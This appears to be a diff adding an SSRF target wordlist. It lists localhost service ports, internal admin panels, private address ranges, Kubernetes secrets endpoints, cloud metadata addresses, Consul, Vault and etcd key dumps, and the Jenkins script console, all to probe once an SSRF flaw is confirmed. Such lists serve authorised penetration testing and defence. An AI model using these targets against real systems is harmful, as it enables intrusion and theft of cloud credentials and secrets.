@@ -1,0 +1,67 @@
+# Internal hostnames / services — SSRF target list
+# Probe after confirming SSRF primitive
+
+# Localhost variants
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+http://127.0.0.1:3000/
+http://127.0.0.1:5000/
+http://127.0.0.1:8000/
+http://127.0.0.1:9000/
+http://127.0.0.1:9200/
+http://127.0.0.1:11211/
+http://127.0.0.1:6379/
+http://127.0.0.1:27017/
+http://localhost/
+http://0.0.0.0/
+
+# Common internal admin panels
+http://127.0.0.1/admin
+http://127.0.0.1:8080/admin
+http://127.0.0.1/manager/html
+http://127.0.0.1:8080/manager/html
+http://127.0.0.1:8983/solr/
+http://127.0.0.1:5601/
+http://127.0.0.1:15672/
+http://127.0.0.1:8500/v1/agent/self
+
+# Private RFC1918 sweep (sample — expand with ffuf)
+http://10.0.0.1/
+http://10.0.0.2/
+http://192.168.0.1/
+http://192.168.1.1/
+http://172.16.0.1/
+
+# Kubernetes / service discovery
+http://kubernetes.default.svc/
+http://kubernetes.default.svc/api/v1/namespaces/default/secrets
+http://kube-dns.kube-system.svc/
+http://redis.default.svc:6379/
+http://mysql.default.svc:3306/
+http://postgres.default.svc:5432/
+http://elasticsearch.default.svc:9200/
+
+# Link-local / metadata
+http://169.254.169.254/
+http://metadata.google.internal/
+http://100.100.100.200/
+
+# AWS internal services
+http://169.254.170.2/
+http://[fd00:ec2::254]/
+
+# Consul / Vault / etcd
+http://127.0.0.1:8500/v1/kv/?recurse
+http://127.0.0.1:8200/v1/sys/health
+http://127.0.0.1:2379/v2/keys/?recursive=true
+
+# Jenkins / CI
+http://127.0.0.1:8080/script
+http://127.0.0.1:8080/computer/
+
+# Prometheus / Grafana
+http://127.0.0.1:9090/
+http://127.0.0.1:3000/login
